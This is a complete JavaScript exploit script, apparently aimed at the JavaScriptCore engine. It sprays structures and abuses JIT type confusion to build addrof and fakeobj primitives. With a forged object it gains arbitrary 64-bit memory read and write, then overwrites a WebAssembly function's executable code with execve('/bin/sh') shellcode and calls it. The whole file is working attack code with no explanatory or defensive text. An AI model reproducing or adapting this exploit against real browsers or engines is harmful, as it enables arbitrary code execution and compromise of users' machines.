var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

var structs = [];
function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
            var a = [13.37];
            a['prop'] = 13.37;
            a['prop' + i] = 13.37;
            structs.push(a);
        }
}


sprayStructures();

myArray = [13.37, 73.31];
myArray.propp = 1337;

function returnElem() {
    return myArray[0];
}

function setElem(obj){
    myArray[0] = obj;
}
for (var i = 0; i < 100000; i++){
    returnElem();
    setElem(13.37);
}

delete myArray.propp;

myArray[0]={};

function addrof(obj){
    myArray[0] = obj;
    return f2i(returnElem());
}
function fakeobj(addr){
    addr = i2f(addr);
    setElem(addr);
    return myArray[0];
}


victim = structs[0x300];
i32[0]= 0x200;
i32[1] = 0x01082107 - 0x10000;
var container={
    JSCell: f64[0],
    buttefly: victim
};
container_addr = addrof(container)
print(describe(container))
print(container_addr.toString(16))

hax= fakeobj(container_addr+0x10);



var unboxed = [1.1]
unboxed[0]=3.3

//ArrayWithContigous
var boxed = [{}]


hax[1] = i2f(addrof(boxed))
var shared = victim[1]
hax[1] = i2f(addrof(unboxed))
victim[1] = shared;
print(describe(victim))
print(describe(boxed))
print(describe(unboxed))

var stage2={
    addrof: function(obj){
        boxed[0]=obj;
        return f2i(unboxed[0])
    },
    fakeobj: function(addr){
        unboxed[0]=i2f(addr)
        return boxed[0]
    },
    read64:function(addr){
        hax[1]=i2f(addr+0x10)
        return this.addrof(victim.prop)
    },
    write64:function(addr,data){
        hax[1]=i2f(addr+0x10)
        victim.prop = this.fakeobj(data)
    },
    write: function(addr, shellcode) {
        var theAddr = addr;
        for(var i=0;i<shellcode.length;i++){
            this.write64(addr+i,shellcode[i].charCodeAt())
        }
    },
    pwn:function(){
        var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        var wasm_mod = new WebAssembly.Module(wasm_code);
        var wasm_instance = new WebAssembly.Instance(wasm_mod);
        var f = wasm_instance.exports.main;
        var addr_f = this.addrof(f);
        var addr_p = this.read64(addr_f + 0x40);
        var addr_shellcode = this.read64(addr_p);
        print((addr_shellcode).toString(16));
        shellcode = "j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05"
        this.write(addr_shellcode, shellcode);
        readline();
        f();
    },

};

stage2.pwn()
